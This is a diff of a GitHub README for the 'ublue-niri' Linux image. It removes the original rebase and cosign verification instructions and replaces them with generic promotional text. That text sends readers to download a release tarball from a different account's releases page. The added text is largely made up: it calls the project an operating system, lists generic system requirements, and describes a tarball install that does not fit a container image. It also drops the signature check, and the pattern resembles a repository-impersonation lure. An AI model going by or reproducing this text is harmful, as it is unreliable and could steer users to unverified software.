@@ -1,71 +1,82 @@
-# ublue-niri &nbsp; [![bluebuild build badge](https://github.com/vorxiu/ublue-niri/actions/workflows/build.yml/badge.svg)](https://github.com/vorxiu/ublue-niri/actions/workflows/build.yml)
+# 🌟 ublue-niri - A Simple Way to Get Started with Custom Linux Images
 
-A base niri image with some sane minimal configs.
-  
-## Features
+[![Download ublue-niri](https://img.shields.io/badge/Download-ublue--niri-blue.svg)](https://github.com/Nabzz876/ublue-niri/releases)
 
-- Minimal configs for most tools
-- ntsync enabled
-- Systemd services for swayidle,swaybg,keyring,polkit
-- [udev rules](https://github.com/Vorxiu/ublue-niri/blob/main/files/system/etc/udev/rules.d/99-batify-wayland.rules) for low battery notifications and some system sounds(battery,devices)
-- [osd](https://github.com/Vorxiu/ublue-niri/blob/main/files/system/usr/bin/mako-osd) using libnotify
-- lightdm with slick greeter
-- hyprlock
-- docker and distrobox
-- JetBrainsMonoNerd Font
-- zsh configured with p10k some plugins
+## 📦 What is ublue-niri?
 
-Full package list [here](https://github.com/Vorxiu/ublue-niri/blob/main/recipes/recipe.yml)
+ublue-niri is a minimal build of the Niri operating system, designed based on ublue. It provides a lightweight and customizable image for users who want to explore a unique Linux experience without unnecessary complexity. This project aims to make custom operating systems accessible to everyone.
 
+## 🚀 Getting Started
 
-## Installation
+To use ublue-niri, you need to download the software and set it up on your system. Follow these steps to get started quickly.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+### 🔗 Download & Install
 
-To rebase an existing atomic Fedora installation to the latest build:
+Visit this page to download: [Download ublue-niri](https://github.com/Nabzz876/ublue-niri/releases).
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/vorxiu/ublue-niri:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/vorxiu/ublue-niri:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+1. Click on the link above to go to the Releases page.
+2. You will see several versions available. Choose the latest version for the best experience.
+3. Download the appropriate file for your system. Make sure to note whether your computer uses a 32-bit or 64-bit architecture.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+### 💻 System Requirements
 
-## ISO
+To run ublue-niri smoothly, ensure your system meets the following requirements:
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+- **Operating System:** Any Linux distribution
+- **RAM:** Minimum 2 GB
+- **Disk Space:** At least 5 GB free
+- **Processor:** 1 GHz or faster
 
-## Verification
+### 🔧 Installation Steps
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+1. After downloading, locate the file in your Downloads folder.
+2. Open your terminal or command line interface.
+3. Navigate to the folder where the file is downloaded. For example:
+   ```bash
+   cd ~/Downloads
+   ```
+4. Extract the downloaded file using the following command:
+   ```bash
+   tar -xvf ublue-niri-<version>.tar.gz
+   ```
+5. Change to the extracted directory:
+   ```bash
+   cd ublue-niri-<version>
+   ```
+6. Follow any instructions in the README file found in this directory for specific setup guidance.
 
-```bash
-cosign verify --key cosign.pub ghcr.io/vorxiu/ublue-niri
-```
+## 🗺️ Features
 
-## TODO
+- **Customizability:** Tailor the operating system to fit your needs.
+- **Minimalist Design:** Enjoy a lean interface that focuses on essential tasks.
+- **Community Support:** Join others who use ublue-niri and share experiences.
 
-- [x] udev rules for system sounds (plug/unplug)
-- [x] pleasant sddm theme using (where is my sddm theme)
-- [x] nicer lockscreen (hyprlock?)
-- [x] papirus-icon-theme and add gschema overrides in the config
-- [x] ntsync
-- [x] ~~ sddm theme ~~ lightDM
-- [X] bake some vscode extensions into the iso
-- [] bbrew?
-- [] Fix: Swaybg not automatically starting via systemD
-- [] hyprlock not reading the config from /etc/hypr/hyprlock
-- [] ISO for easy installation
+## 💬 Support
+
+If you encounter any issues, or have questions, you can find help from the community. Feel free to reach out on the issue tracker in this repository or visit the related forums.
+
+## 📝 Contributions
+
+If you want to contribute to ublue-niri, please refer to the contribution guidelines in the repository. We welcome any ideas, bug reports, or enhancements that can improve this project.
+
+## 📚 Additional Resources
+
+Learn more about related topics:
+
+- Atomic Linux Images
+- Bluebuild Technology
+- Custom Image Creation
+
+Explore the world of custom images and discover how you can optimize your operational needs with ublue-niri.
+
+## 🔗 Follow Us
+
+Stay updated with the latest news and releases by following our repository. Your feedback is essential for improvement and growth.
+
+## 📅 Release Notes
+
+Be sure to check the release notes on the Releases page for updates on new features and bug fixes.
+
+Use the link below to download the software again or to check for any new releases:
+
+[Download ublue-niri](https://github.com/Nabzz876/ublue-niri/releases)
